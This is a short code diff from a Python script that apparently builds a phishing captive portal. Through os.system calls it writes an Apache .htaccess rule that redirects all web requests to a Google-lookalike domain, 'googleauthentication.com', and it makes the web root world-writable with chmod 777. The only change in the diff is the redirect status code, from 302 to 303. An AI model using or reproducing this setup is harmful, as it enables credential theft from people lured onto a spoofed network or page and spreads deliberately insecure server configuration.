@@ -89,7 +89,7 @@ try:
   captivePortal_filename = input("[!?] Select file name - /var/www/html/:(index.html) ") or "index.html"
   os.system("sudo echo -e \"RewriteEngine on\n\
 		RewriteCond %{REQUEST_URI} !^/"+captivePortal_filename+"\n\
-		RewriteRule (.*) http://googleauthentication.com/"+captivePortal_filename+" [R=302,L]\" > /var/www/html/.htaccess")
+		RewriteRule (.*) http://googleauthentication.com/"+captivePortal_filename+" [R=303,L]\" > /var/www/html/.htaccess")
   os.system("sudo chmod 777 /var/www/html/ && sudo chmod 777 /var/www/html/*")
   os.system("sudo echo -e \"<Directory /var/www/>\n\
    	 	Options Indexes FollowSymLinks\n\
